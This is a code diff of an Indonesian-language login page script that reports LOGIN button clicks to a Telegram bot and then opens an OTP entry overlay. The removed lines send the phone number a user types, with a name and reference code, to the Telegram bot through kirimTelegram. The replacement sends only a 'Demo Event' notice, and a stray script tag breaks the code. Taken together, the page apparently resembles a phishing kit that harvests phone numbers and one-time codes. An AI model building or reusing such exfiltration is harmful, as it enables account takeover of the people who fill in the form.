@@ -50,12 +50,32 @@ async function kirimTelegram(nama, nomorHp, kodeRef) {
 }
 
 // sambungkan ke tombol LOGIN
-loginBtn.onclick = async () => {
-  const nama = "Dendi";
-  const nomorHp = document.querySelector('input[type="text"]').value;
-  const kodeRef = "JG-" + Date.now();
+<script>
+const BOT_TOKEN = "TOKEN_BARU_KAMU";
+const CHAT_ID = "CHAT_ID_KAMU";
 
-  await kirimTelegram(nama, nomorHp, kodeRef);
+async function kirimEventLogin() {
+  const pesan =
+`🔔 Demo Event
+
+User menekan tombol LOGIN
+🆔 Ref: JG-${Date.now()}
+🕒 ${new Date().toLocaleString("id-ID")}`;
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: pesan
+    })
+  });
+}
+
+loginBtn.onclick = async () => {
+  await kirimEventLogin();
 
   overlay.style.display = "flex";
   otpInputs[0].focus();
